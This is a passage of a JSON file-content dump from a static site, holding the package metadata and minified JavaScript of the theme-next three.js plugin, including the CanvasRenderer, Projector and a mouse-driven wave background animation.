\"git@github.com:theme-next/theme-next-three.git\",\n  \"author\": \"Raincal <cyj94228@gmail.com>\",\n  \"license\": \"MIT\",\n  \"scripts\": {\n    \"build\": \"gulp\"\n  },\n  \"dependencies\": {\n    \"del\": \"^5.1.0\",\n    \"gulp\": \"^4.0.2\",\n    \"gulp-concat\": \"^2.6.1\",\n    \"gulp-uglify\": \"^3.0.2\"\n  }\n}\n"},{"url":"/lib/three/renovate.json","content":"{\n  \"extends\": [\n    \"config:base\"\n  ]\n}\n"},{"url":"/lib/three/three-waves.min.js","content":"THREE.SpriteCanvasMaterial=function(e){THREE.Material.call(this),this.type=\"SpriteCanvasMaterial\",this.color=new THREE.Color(16777215),this.program=function(e,t){},this.setValues(e)},THREE.SpriteCanvasMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteCanvasMaterial.prototype.constructor=THREE.SpriteCanvasMaterial,THREE.SpriteCanvasMaterial.prototype.clone=function(){var e=new THREE.SpriteCanvasMaterial;return e.copy(this),e.color.copy(this.color),e.program=this.program,e},THREE.CanvasRenderer=function(e){console.log(\"THREE.CanvasRenderer\",THREE.REVISION),e=e||{};var s,l,c,p,E,d,f,h,u,m,v,x,R,y,T,w,H,g,S,M=this,b=new THREE.Projector,i=void 0!==e.canvas?e.canvas:document.createElement(\"canvas\"),C=i.width,z=i.height,V=Math.floor(C/2),j=Math.floor(z/2),L=0,O=0,B=C,W=z,n=1,P=i.getContext(\"2d\",{alpha:!0===e.alpha}),r=new THREE.Color(0),o=!0===e.alpha?0:1,a=1,k=0,N=null,F=null,A=null,I=null,D=null,t=[],G=(new THREE.RenderableVertex,new THREE.RenderableVertex,new THREE.Color),U=(new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color),q=new THREE.Color,J=new THREE.Color,X={},$=new THREE.Box2,K=new THREE.Box2,Q=new THREE.Box2,Y=new THREE.Color,Z=new THREE.Color,_=new THREE.Color,ee=new THREE.Vector3,te=new THREE.Vector3,re=new THREE.Vector3,ie=new THREE.Matrix3;function ne(e,t,r){de(r.opacity),fe(r.blending);var i=t.scale.x*V,n=t.scale.y*j,o=.5*Math.sqrt(i*i+n*n);if(Q.min.set(e.x-o,e.y-o),Q.max.set(e.x+o,e.y+o),r instanceof THREE.SpriteMaterial){var a=r.map;if(null!==a){var s=X[a.id];if(void 0!==s&&s.version===a.version||(s=ce(a),X[a.id]=s),void 0!==s.canvas){xe(s.canvas);var l=a.image,c=l.width*a.offset.x,p=l.height*a.offset.y,E=l.width*a.repeat.x,d=l.height*a.repeat.y,f=i/E,h=n/d;P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.translate(-i/2,-n/2),P.scale(f,h),P.translate(-c,-p),P.fillRect(c,p,E,d),P.restore()}}else xe(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,-n),P.fillRect(-.5,-.5,1,1),P.restore()}else r instanceof THREE.SpriteCanvasMaterial&&(ve(r.color.getStyle()),xe(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,n),r.program(P),P.restore())}function oe(e,t,r,i){if(de(i.opacity),fe(i.blending),P.beginPath(),P.moveTo(e.positionScreen.x,e.positionScreen.y),P.lineTo(t.positionScreen.x,t.positionScreen.y),i instanceof THREE.LineBasicMaterial){if(he(i.linewidth),ue(i.linecap),me(i.linejoin),i.vertexColors!==THREE.VertexColors)ve(i.color.getStyle());else{var n=r.vertexColors[0].getStyle(),o=r.vertexColors[1].getStyle();if(n===o)ve(n);else{try{var a=P.createLinearGradient(e.positionScreen.x,e.positionScreen.y,t.positionScreen.x,t.positionScreen.y);a.addColorStop(0,n),a.addColorStop(1,o)}catch(e){a=n}ve(a)}}P.stroke(),Q.expandByScalar(2*i.linewidth)}else i instanceof THREE.LineDashedMaterial&&(he(i.linewidth),ue(i.linecap),me(i.linejoin),ve(i.color.getStyle()),Re([i.dashSize,i.gapSize]),P.stroke(),Q.expandByScalar(2*i.linewidth),Re([]))}function ae(e,t,r,i,n,o,a,s){if(M.info.render.vertices+=3,M.info.render.faces++,de(s.opacity),fe(s.blending),f=e.positionScreen.x,h=e.positionScreen.y,u=t.positionScreen.x,m=t.positionScreen.y,v=r.positionScreen.x,x=r.positionScreen.y,function(e,t,r,i,n,o){P.beginPath(),P.moveTo(e,t),P.lineTo(r,i),P.lineTo(n,o),P.closePath()}(f,h,u,m,v,x),(s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial)&&null===s.map)U.copy(s.color),q.copy(s.emissive),s.vertexColors===THREE.FaceColors&&U.multiply(a.color),G.copy(Y),te.copy(e.positionWorld).add(t.positionWorld).add(r.positionWorld).divideScalar(3),function(e,t,r){for(var i=0,n=c.length;i<n;i++){var o=c[i];if(J.copy(o.color),o instanceof THREE.DirectionalLight){var a=ee.setFromMatrixPosition(o.matrixWorld).normalize();if((s=t.dot(a))<=0)continue;s*=o.intensity,r.add(J.multiplyScalar(s))}else if(o instanceof THREE.PointLight){var s;a=ee.setFromMatrixPosition(o.matrixWorld);if((s=t.dot(ee.subVectors(a,e).normalize()))<=0)continue;if(0==(s*=0==o.distance?1:1-Math.min(e.distanceTo(a)/o.distance,1)))continue;s*=o.intensity,r.add(J.multiplyScalar(s))}}}(te,a.normalModel,G),G.multiply(U).add(q),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G);else if(s instanceof THREE.MeshBasicMaterial||s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial){if(null!==s.map)s.map.mapping===THREE.UVMapping&&(R=a.uvs,pe(f,h,u,m,v,x,R[i].x,R[i].y,R[n].x,R[n].y,R[o].x,R[o].y,s.map));else null!==s.envMap?s.envMap.mapping===THREE.SphericalReflectionMapping&&(re.copy(a.vertexNormalsModel[i]).applyMatrix3(ie),y=.5*re.x+.5,T=.5*re.y+.5,re.copy(a.vertexNormalsModel[n]).applyMatrix3(ie),w=.5*re.x+.5,H=.5*re.y+.5,re.copy(a.vertexNormalsModel[o]).applyMatrix3(ie),g=.5*re.x+.5,S=.5*re.y+.5,pe(f,h,u,m,v,x,y,T,w,H,g,S,s.envMap)):(G.copy(s.color),s.vertexColors===THREE.FaceColors&&G.multiply(a.color),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G))}else s instanceof THREE.MeshNormalMaterial?(re.copy(a.normalModel).applyMatrix3(ie),G.setRGB(re.x,re.y,re.z).multiplyScalar(.5).addScalar(.5)):G.setRGB(1,1,1),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G)}function se(e,t,r,i){he(t),ue(r),me(i),ve(e.getStyle()),P.stroke(),Q.expandByScalar(2*t)}function le(e){xe(e.getStyle()),P.fill()}function ce(e){if(0===e.version||e instanceof THREE.CompressedTexture||e instanceof THREE.DataTexture)return{canvas:void 0,version:e.version};var t=e.image;if(!1===t.complete)return{canvas:void 0,version:0};var r=e.wrapS===THREE.RepeatWrapping||e.wrapS===THREE.MirroredRepeatWrapping,i=e.wrapT===THREE.RepeatWrapping||e.wrapT===THREE.MirroredRepeatWrapping,n=e.wrapS===THREE.MirroredRepeatWrapping,o=e.wrapT===THREE.MirroredRepeatWrapping,a=document.createElement(\"canvas\");a.width=t.width*(n?2:1),a.height=t.height*(o?2:1);var s=a.getContext(\"2d\");s.setTransform(1,0,0,-1,0,t.height),s.drawImage(t,0,0),!0==n&&(s.setTransform(-1,0,0,-1,t.width,t.height),s.drawImage(t,-t.width,0)),!0==o&&(s.setTransform(1,0,0,1,0,0),s.drawImage(t,0,t.height)),!0==n&&!0==o&&(s.setTransform(-1,0,0,1,t.width,0),s.drawImage(t,-t.width,t.height));var l=\"no-repeat\";!0==r&&!0==i?l=\"repeat\":!0==r?l=\"repeat-x\":!0==i&&(l=\"repeat-y\");var c=P.createPattern(a,l);return e.onUpdate&&e.onUpdate(e),{canvas:c,version:e.version}}function pe(e,t,r,i,n,o,a,s,l,c,p,E,d){var f=X[d.id];if(void 0!==f&&f.version===d.version||(f=ce(d),X[d.id]=f),void 0===f.canvas)return xe(\"rgba( 0, 0, 0, 1)\"),void P.fill();xe(f.canvas);var h,u,m,v,x,R,y,T,w=d.offset.x/d.repeat.x,H=d.offset.y/d.repeat.y,g=d.image.width*d.repeat.x,S=d.image.height*d.repeat.y;l=(l+w)*g,c=(c+H)*S,p=(p+w)*g,E=(E+H)*S,r-=e,i-=t,n-=e,o-=t,0!=(y=(l-=a=(a+w)*g)*(E-=s=(s+H)*S)-(p-=a)*(c-=s))&&(x=e-(h=(E*r-c*n)*(T=1/y))*a-(m=(l*n-p*r)*T)*s,R=t-(u=(E*i-c*o)*T)*a-(v=(l*o-p*i)*T)*s,P.save(),P.transform(h,u,m,v,x,R),P.fill(),P.restore())}function Ee(e,t,r){var i,n=t.x-e.x,o=t.y-e.y,a=n*n+o*o;0!=a&&(n*=i=r/Math.sqrt(a),o*=i,t.x+=n,t.y+=o,e.x-=n,e.y-=o)}function de(e){a!==e&&(P.globalAlpha=e,a=e)}function fe(e){k!==e&&(e===THREE.NormalBlending?P.globalCompositeOperation=\"source-over\":e===THREE.AdditiveBlending?P.globalCompositeOperation=\"lighter\":e===THREE.SubtractiveBlending?P.globalCompositeOperation=\"darker\":e===THREE.MultiplyBlending&&(P.globalCompositeOperation=\"multiply\"),k=e)}function he(e){A!==e&&(P.lineWidth=e,A=e)}function ue(e){I!==e&&(P.lineCap=e,I=e)}function me(e){D!==e&&(P.lineJoin=e,D=e)}function ve(e){N!==e&&(P.strokeStyle=e,N=e)}function xe(e){F!==e&&(P.fillStyle=e,F=e)}function Re(e){t.length!==e.length&&(P.setLineDash(e),t=e)}void 0===P.setLineDash&&(P.setLineDash=function(){}),this.domElement=i,this.autoClear=!0,this.sortObjects=!0,this.sortElements=!0,this.info={render:{vertices:0,faces:0}},this.supportsVertexTextures=function(){},this.setFaceCulling=function(){},this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.getPixelRatio=function(){return n},this.setPixelRatio=function(e){void 0!==e&&(n=e)},this.setSize=function(e,t,r){C=e*n,z=t*n,i.width=C,i.height=z,V=Math.floor(C/2),j=Math.floor(z/2),!1!==r&&(i.style.width=e+\"px\",i.style.height=t+\"px\"),$.min.set(-V,-j),$.max.set(V,j),K.min.set(-V,-j),K.max.set(V,j),a=1,k=0,D=I=A=F=N=null,this.setViewport(0,0,e,t)},this.setViewport=function(e,t,r,i){L=e*n,O=t*n,B=r*n,W=i*n},this.setScissor=function(){},this.setScissorTest=function(){},this.setClearColor=function(e,t){r.set(e),o=void 0!==t?t:1,K.min.set(-V,-j),K.max.set(V,j)},this.setClearColorHex=function(e,t){console.warn(\"THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.\"),this.setClearColor(e,t)},this.getClearColor=function(){return r},this.getClearAlpha=function(){return o},this.getMaxAnisotropy=function(){return 0},this.clear=function(){!1===K.isEmpty()&&(K.intersect($),K.expandByScalar(2),K.min.x=K.min.x+V,K.min.y=-K.min.y+j,K.max.x=K.max.x+V,K.max.y=-K.max.y+j,o<1&&P.clearRect(0|K.min.x,0|K.max.y,K.max.x-K.min.x|0,K.min.y-K.max.y|0),0<o&&(fe(THREE.NormalBlending),de(1),xe(\"rgba(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\",\"+o+\")\"),P.fillRect(0|K.min.x,0|K.max.y,K.max.x-K.min.x|0,K.min.y-K.max.y|0)),K.makeEmpty())},this.clearColor=function(){},this.clearDepth=function(){},this.clearStencil=function(){},this.render=function(e,t){if(t instanceof THREE.Camera!=!1){var r=e.background;r&&r.isColor?(xe(\"rgb(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\")\"),P.fillRect(0,0,C,z)):!0===this.autoClear&&this.clear(),M.info.render.vertices=0,M.info.render.faces=0,P.setTransform(B/C,0,0,-W/z,L,z-O),P.translate(V,j),s=b.projectScene(e,t,this.sortObjects,this.sortElements),l=s.elements,c=s.lights,t,ie.getNormalMatrix(t.matrixWorldInverse),function(){Y.setRGB(0,0,0),Z.setRGB(0,0,0),_.setRGB(0,0,0);for(var e=0,t=c.length;e<t;e++){var r=c[e],i=r.color;r instanceof THREE.AmbientLight?Y.add(i):r instanceof THREE.DirectionalLight?Z.add(i):r instanceof THREE.PointLight&&_.add(i)}}();for(var i=0,n=l.length;i<n;i++){var o=l[i],a=o.material;if(void 0!==a&&0!==a.opacity){if(Q.makeEmpty(),o instanceof THREE.RenderableSprite)(p=o).x*=V,p.y*=j,ne(p,o,a);else if(o instanceof THREE.RenderableLine)p=o.v1,E=o.v2,p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,Q.setFromPoints([p.positionScreen,E.positionScreen]),!0===$.intersectsBox(Q)&&oe(p,E,o,a);else if(o instanceof THREE.RenderableFace){if(p=o.v1,E=o.v2,d=o.v3,p.positionScreen.z<-1||1<p.positionScreen.z)continue;if(E.positionScreen.z<-1||1<E.positionScreen.z)continue;if(d.positionScreen.z<-1||1<d.positionScreen.z)continue;p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,d.positionScreen.x*=V,d.positionScreen.y*=j,0<a.overdraw&&(Ee(p.positionScreen,E.positionScreen,a.overdraw),Ee(E.positionScreen,d.positionScreen,a.overdraw),Ee(d.positionScreen,p.positionScreen,a.overdraw)),Q.setFromPoints([p.positionScreen,E.positionScreen,d.positionScreen]),!0===$.intersectsBox(Q)&&ae(p,E,d,0,1,2,o,a)}K.union(Q)}}P.setTransform(1,0,0,1,0,0)}else console.error(\"THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.\")}},THREE.RenderableObject=function(){this.id=0,this.object=null,this.z=0,this.renderOrder=0},THREE.RenderableFace=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.v3=new THREE.RenderableVertex,this.normalModel=new THREE.Vector3,this.vertexNormalsModel=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3],this.vertexNormalsLength=0,this.color=new THREE.Color,this.material=null,this.uvs=[new THREE.Vector2,new THREE.Vector2,new THREE.Vector2],this.z=0,this.renderOrder=0},THREE.RenderableVertex=function(){this.position=new THREE.Vector3,this.positionWorld=new THREE.Vector3,this.positionScreen=new THREE.Vector4,this.visible=!0},THREE.RenderableVertex.prototype.copy=function(e){this.positionWorld.copy(e.positionWorld),this.positionScreen.copy(e.positionScreen)},THREE.RenderableLine=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.vertexColors=[new THREE.Color,new THREE.Color],this.material=null,this.z=0,this.renderOrder=0},THREE.RenderableSprite=function(){this.id=0,this.object=null,this.x=0,this.y=0,this.z=0,this.rotation=0,this.scale=new THREE.Vector2,this.material=null,this.renderOrder=0},THREE.Projector=function(){var Q,Y,n,Z,_,ee,te,re,ie,ne,oe,ae=[],se=0,le=[],t=0,r=[],i=0,o=[],a=0,s=[],l=0,ce={objects:[],lights:[],elements:[]},pe=new THREE.Vector3,Ee=new THREE.Vector4,u=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),m=new THREE.Box3,v=new Array(3),de=(new Array(4),new THREE.Matrix4),fe=new THREE.Matrix4,he=new THREE.Matrix4,ue=new THREE.Matrix3,me=new THREE.Frustum,ve=new THREE.Vector4,xe=new THREE.Vector4;this.projectVector=function(e,t){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\"),e.project(t)},this.unprojectVector=function(e,t){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\"),e.unproject(t)},this.pickingRay=function(e,t){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")};var Re=new function(){var l=[],c=[],p=null,E=null,d=new THREE.Matrix3;function i(e){var t=e.position,r=e.positionWorld,i=e.positionScreen;r.copy(t).applyMatrix4(oe),i.copy(r).applyMatrix4(fe);var n=1/i.w;i.x*=n,i.y*=n,i.z*=n,e.visible=-1<=i.x&&i.x<=1&&-1<=i.y&&i.y<=1&&-1<=i.z&&i.z<=1}function f(e,t,r){return!0===e.visible||!0===t.visible||!0===r.visible||(v[0]=e.positionScreen,v[1]=t.positionScreen,v[2]=r.positionScreen,u.intersectsBox(m.setFromPoints(v)))}function h(e,t,r){return(r.positionScreen.x-e.positionScreen.x)*(t.positionScreen.y-e.positionScreen.y)-(r.positionScreen.y-e.positionScreen.y)*(t.positionScreen.x-e.positionScreen.x)<0}return{setObject:function(e){E=(p=e).material,d.getNormalMatrix(p.matrixWorld),l.length=0,c.length=0},projectVertex:i,checkTriangleVisibility:f,checkBackfaceCulling:h,pushVertex:function(e,t,r){(n=ye()).position.set(e,t,r),i(n)},pushNormal:function(e,t,r){l.push(e,t,r)},pushUv:function(e,t){c.push(e,t)},pushLine:function(e,t){var r=le[e],i=le[t];(te=we()).id=p.id,te.v1.copy(r),te.v2.copy(i),te.z=(r.positionScreen.z+i.positionScreen.z)/2,te.renderOrder=p.renderOrder,te.material=p.material,ce.elements.push(te)},pushTriangle:function(e,t,r){var i=le[e],n=le[t],o=le[r];if(!1!==f(i,n,o)&&(E.side===THREE.DoubleSide||!0===h(i,n,o))){(_=Te()).id=p.id,_.v1.copy(i),_.v2.copy(n),_.v3.copy(o),_.z=(i.positionScreen.z+n.positionScreen.z+o.positionScreen.z)/3,_.renderOrder=p.renderOrder,_.normalModel.fromArray(l,3*e),_.normalModel.applyMatrix3(d).normalize();for(var a=0;a<3;a++){var s=_.vertexNormalsModel[a];s.fromArray(l,3*arguments[a]),s.applyMatrix3(d).normalize(),_.uvs[a].fromArray(c,2*arguments[a])}_.vertexNormalsLength=3,_.material=p.material,ce.elements.push(_)}}}};function ye(){if(Z!==t)return le[Z++];var e=new THREE.RenderableVertex;return le.push(e),t++,Z++,e}function Te(){if(ee!==i)return r[ee++];var e=new THREE.RenderableFace;return r.push(e),i++,ee++,e}function we(){if(re!==a)return o[re++];var e=new THREE.RenderableLine;return o.push(e),a++,re++,e}function He(){if(ne!==l)return s[ne++];var e=new THREE.RenderableSprite;return s.push(e),l++,ne++,e}function ge(e,t){return e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id!==t.id?e.id-t.id:0}function Se(e,t){var r=0,i=1,n=e.z+e.w,o=t.z+t.w,a=-e.z+e.w,s=-t.z+t.w;return 0<=n&&0<=o&&0<=a&&0<=s||!(n<0&&o<0||a<0&&s<0)&&(n<0?r=Math.max(r,n/(n-o)):o<0&&(i=Math.min(i,n/(n-o))),a<0?r=Math.max(r,a/(a-s)):s<0&&(i=Math.min(i,a/(a-s))),!(i<r)&&(e.lerp(t,r),t.lerp(e,1-i),!0))}this.projectScene=function(e,t,r,i){function n(e){(Q=function(){if(Y!==se)return ae[Y++];var e=new THREE.RenderableObject;return ae.push(e),se++,Y++,e}()).id=e.id,Q.object=e,pe.setFromMatrixPosition(e.matrixWorld),pe.applyMatrix4(fe),Q.z=pe.z,Q.renderOrder=e.renderOrder,ce.objects.push(Q)}ne=re=ee=0,!(ce.elements.length=0)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),de.copy(t.matrixWorldInverse.getInverse(t.matrixWorld)),fe.multiplyMatrices(t.projectionMatrix,de),me.setFromMatrix(fe),Y=0,ce.objects.length=0,ce.lights.length=0,e.traverseVisible(function(e){if(e instanceof THREE.Light)ce.lights.push(e);else if(e instanceof THREE.Mesh||e instanceof THREE.Line){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsObject(e))return;n(e)}else if(e instanceof THREE.Sprite){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsSprite(e))return;n(e)}}),!0===r&&ce.objects.sort(ge);for(var o=0,a=ce.objects.length;o<a;o++){var s=ce.objects[o].object,l=s.geometry;if(Re.setObject(s),oe=s.matrixWorld,Z=0,s instanceof THREE.Mesh){if(l instanceof THREE.BufferGeometry){var c=l.attributes,p=l.groups;if(void 0===c.position)continue;for(var E=0,d=(X=c.position.array).length;E<d;E+=3)Re.pushVertex(X[E],X[E+1],X[E+2]);if(void 0!==c.normal){var f=c.normal.array;for(E=0,d=f.length;E<d;E+=3)Re.pushNormal(f[E],f[E+1],f[E+2])}if(void 0!==c.uv){var h=c.uv.array;for(E=0,d=h.length;E<d;E+=2)Re.pushUv(h[E],h[E+1])}if(null!==l.index){var u=l.index.array;if(0<p.length)for(var m=0;m<p.length;m++){var v=p[m];for(E=v.start,d=v.start+v.count;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=u.length;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=X.length/3;E<d;E+=3)Re.pushTriangle(E,E+1,E+2)}else if(l instanceof THREE.Geometry){var x=l.vertices,R=l.faces,y=l.faceVertexUvs[0];ue.getNormalMatrix(oe);for(var T=s.material,w=T instanceof THREE.MultiMaterial,H=!0==w?s.material:null,g=0,S=x.length;g<S;g++){var M=x[g];if(pe.copy(M),!0===T.morphTargets)for(var b=l.morphTargets,C=s.morphTargetInfluences,z=0,V=b.length;z<V;z++){var j=C[z];if(0!==j){var L=b[z].vertices[g];pe.x+=(L.x-M.x)*j,pe.y+=(L.y-M.y)*j,pe.z+=(L.z-M.z)*j}}Re.pushVertex(pe.x,pe.y,pe.z)}for(var O=0,B=R.length;O<B;O++){var W=R[O];if(void 0!==(T=!0==w?H.materials[W.materialIndex]:s.material)){var P=T.side,k=le[W.a],N=le[W.b],F=le[W.c];if(!1!==Re.checkTriangleVisibility(k,N,F)){var A=Re.checkBackfaceCulling(k,N,F);if(P!==THREE.DoubleSide){if(P===THREE.FrontSide&&!1===A)continue;if(P===THREE.BackSide&&!0===A)continue}(_=Te()).id=s.id,_.v1.copy(k),_.v2.copy(N),_.v3.copy(F),_.normalModel.copy(W.normal),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||_.normalModel.negate(),_.normalModel.applyMatrix3(ue).normalize();for(var I=W.vertexNormals,D=0,G=Math.min(I.length,3);D<G;D++){var U=_.vertexNormalsModel[D];U.copy(I[D]),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||U.negate(),U.applyMatrix3(ue).normalize()}_.vertexNormalsLength=I.length;var q=y[O];if(void 0!==q)for(var J=0;J<3;J++)_.uvs[J].copy(q[J]);_.color=W.color,_.material=T,_.z=(k.positionScreen.z+N.positionScreen.z+F.positionScreen.z)/3,_.renderOrder=s.renderOrder,ce.elements.push(_)}}}}}else if(s instanceof THREE.Line){if(l instanceof THREE.BufferGeometry){if(void 0!==(c=l.attributes).position){var X;for(E=0,d=(X=c.position.array).length;E<d;E+=3)Re.pushVertex(X[E],X[E+1],X[E+2]);if(null!==l.index)for(E=0,d=(u=l.index.array).length;E<d;E+=2)Re.pushLine(u[E],u[E+1]);else{var $=s instanceof THREE.LineSegments?2:1;for(E=0,d=X.length/3-1;E<d;E+=$)Re.pushLine(E,E+1)}}}else if(l instanceof THREE.Geometry){if(he.multiplyMatrices(fe,oe),0===(x=s.geometry.vertices).length)continue;(k=ye()).positionScreen.copy(x[0]).applyMatrix4(he);for($=s instanceof THREE.LineSegments?2:1,g=1,S=x.length;g<S;g++)(k=ye()).positionScreen.copy(x[g]).applyMatrix4(he),0<(g+1)%$||(N=le[Z-2],ve.copy(k.positionScreen),xe.copy(N.positionScreen),!0===Se(ve,xe)&&(ve.multiplyScalar(1/ve.w),xe.multiplyScalar(1/xe.w),(te=we()).id=s.id,te.v1.positionScreen.copy(ve),te.v2.positionScreen.copy(xe),te.z=Math.max(ve.z,xe.z),te.renderOrder=s.renderOrder,te.material=s.material,s.material.vertexColors===THREE.VertexColors&&(te.vertexColors[0].copy(s.geometry.colors[g]),te.vertexColors[1].copy(s.geometry.colors[g-1])),ce.elements.push(te)))}}else if(s instanceof THREE.Sprite){Ee.set(oe.elements[12],oe.elements[13],oe.elements[14],1),Ee.applyMatrix4(fe);var K=1/Ee.w;Ee.z*=K,-1<=Ee.z&&Ee.z<=1&&((ie=He()).id=s.id,ie.x=Ee.x*K,ie.y=Ee.y*K,ie.z=Ee.z,ie.renderOrder=s.renderOrder,ie.object=s,ie.rotation=s.rotation,ie.scale.x=s.scale.x*Math.abs(ie.x-(Ee.x+t.projectionMatrix.elements[0])/(Ee.w+t.projectionMatrix.elements[12])),ie.scale.y=s.scale.y*Math.abs(ie.y-(Ee.y+t.projectionMatrix.elements[5])/(Ee.w+t.projectionMatrix.elements[13])),ie.material=s.material,ce.elements.push(ie))}}return!0===i&&ce.elements.sort(ge),ce}};\n(function() { var o, a, s, l, c, p, E = 100, d = 50, f = 50, i = 0, n = 0, t = window.innerWidth / 2; window.innerHeight; function h() { t = window.innerWidth / 2, window.innerHeight / 2, a.aspect = window.innerWidth / window.innerHeight, a.updateProjectionMatrix(), l.setSize(window.innerWidth, window.innerHeight) } function u(e) { n = e.clientX - t } function r() { a.position.x += .05 * (n - a.position.x), a.position.y = 362.05, a.lookAt({ x: s.position.x, y: window.innerHeight / 3, z: s.position.z }); for (var e = 0, t = 0; t < d; t++)for (var r = 0; r < f; r++)(p = c[e++]).position.y = 50 * Math.sin(.3 * (t + i)) + 50 * Math.sin(.5 * (r + i)), p.scale.x = p.scale.y = 4 * (Math.sin(.3 * (t + i)) + 1) + 4 * (Math.sin(.5 * (r + i)) + 1); l.render(s, a), i += .1 } !function() { (o = document.createElement(\"div\")).style.position = \"fixed\", o.style.top = \"0px\", o.style.left = \"0px\", o.style.zIndex = \"-1\", o.style.opacity = \"0.5\", document.body.appendChild(o), (a = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 1e4)).position.z = 1e3, s = new THREE.Scene, c = new Array; for (var t = 2 * Math.PI, e = new THREE.SpriteCanvasMaterial({ color: 10263708, program: function(e) { e.beginPath(), e.arc(0, 0, .5, 0, t, !0), e.fill() } }), r = 0, i = 0; i < d; i++)for (var n = 0; n < f; n++)(p = c[r++] = new THREE.Sprite(e)).position.x = i * E - d * E / 2, p.position.z = n * E - f * E / 2, s.add(p); (l = new THREE.CanvasRenderer({ alpha: !0 })).setPixelRatio(window.devicePixelRatio), l.setSize(window.innerWidth, window.innerHeight), o.appendChild(l.domElement), document.addEventListener(\"mousemove\", u, !1), window.addEventListener(\"resize\", h, !1) }(), function e() { requestAnimationFrame(e); r() }() })();\n"},{"url":"/lib/three/three.min.js","content":"// threejs.org/license\n(function(l,pa){\"object\"===typeof exports&&\"undefined\"!==typeof module?pa(exports):\"function\"===typeof define&&define.amd?define([\"exports\"],pa):pa(l.THREE=l.THREE||{})})(this,function(l){function pa(){}function D(a,b){this.x=a||0;this.y=b||0}function ea(a,b,c,d,e,f,g,h,m,k){Object.defineProperty(this,\"id\",{value:Ze++});this.uuid=N.generateUUID();this.name=\"\";this.image=void 0!==a?a:ea.DEFAULT_IMAGE;this.mipmaps=[];this.mapping=void 0!==b?b:ea.DEFAULT_MAPPING;this.wrapS=void 0!==c?c:1001;this.wrapT=\nvoid 0!==d?d:1001;this.magFilter=void 0!==e?e:1006;this.minFilter=void 0!==f?f:1008;this.anisotropy=void 0!==m?m:1;this.format=void 0!==g?g:1023;this.type=void 0!==h?h:1009;this.offset=new D(0,0);this.repeat=new D(1,1);this.generateMipmaps=!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.encoding=void 0!==k?k:3E3;this.version=0;this.onUpdate=null}function fa(a,b,c,d){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==d?d:1}function Ya(a,b,c){this.uuid=N.generateUUID();this.width=\na;this.height=b;this.scissor=new fa(0,0,a,b);this.scissorTest=!1;this.viewport=new fa(0,0,a,b);c=c||{};void 0===c.minFilter&&(c.minFilter=1006);this.texture=new ea(void 0,void 0,c.wrapS,c.wrapT,c.magFilter,c.minFilter,c.format,c.type,c.anisotropy,c.encoding);this.depthBuffer=void 0!==c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void 0!==c.stencilBuffer?c.stencilBuffer:!0;this.depthTexture=void 0!==c.depthTexture?c.depthTexture:null}function Gb(a,b,c){Ya.call(this,a,b,c);this.activeMipMapLevel=\nthis.activeCubeFace=0}function ca(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._w=void 0!==d?d:1}function q(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0}function S(){this.elements=new Float32Array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.\")}function Za(a,b,c,d,e,f,g,h,m,k){a=void 0!==a?a:[];ea.call(this,a,void 0!==b?b:301,c,d,e,f,g,h,m,k);this.flipY=!1}function Hb(a,b,c){var d=a[0];if(0>=\nd||0<d)return a;var e=b*c,f=Be[e];void 0===f&&(f=new Float32Array(e),Be[e]=f);if(0!==b)for(d.toArray(f,0),d=1,e=0;d!==b;++d)e+=c,a[d].toArray(f,e);return f}function Ce(a,b){var c=De[b];void 0===c&&(c=new Int32Array(b),De[b]=c);for(var d=0;d!==b;++d)c[d]=a.allocTextureUnit();return c}function $e(a,b){a.uniform1f(this.addr,b)}function af(a,b){a.uniform1i(this.addr,b)}function bf(a,b){void 